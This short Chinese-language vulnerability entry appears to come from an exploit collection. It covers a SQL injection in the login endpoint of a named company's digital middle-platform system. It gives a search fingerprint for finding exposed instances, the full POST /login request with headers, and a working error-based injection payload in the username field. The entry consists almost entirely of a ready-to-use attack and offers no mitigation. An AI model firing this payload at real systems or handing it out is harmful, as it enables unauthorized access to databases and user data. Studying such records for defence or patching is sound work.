# 北京中犇科技有限公司数字化智能中台系统login存在SQL注入漏洞

- **系统**：北京中犇科技有限公司数字化智能中台系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/member/get_verify_code/get_code"`
- **请求**：`POST /login HTTP/1.1`
- **关键头**：`Content-Length: 198`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: PHPSESSID=ctrt7ov1do3pboh2bdgskf88po; Hm_lvt_d69712fd2123f4acdea2e8da51577cff=17…`

**请求体 / payload**
```
username=' AND GTID_SUBSET(CONCAT(0x71627a7171,(SELECT (ELT(3088=3088,1))),0x7176766271),3088) AND 'wxEf'='wxEf&loginType=1&password=21232f297a57a5a743894a0e4a801fc3&phone_head=86&wx_openid=&member=
```
- **预期**：200　|　—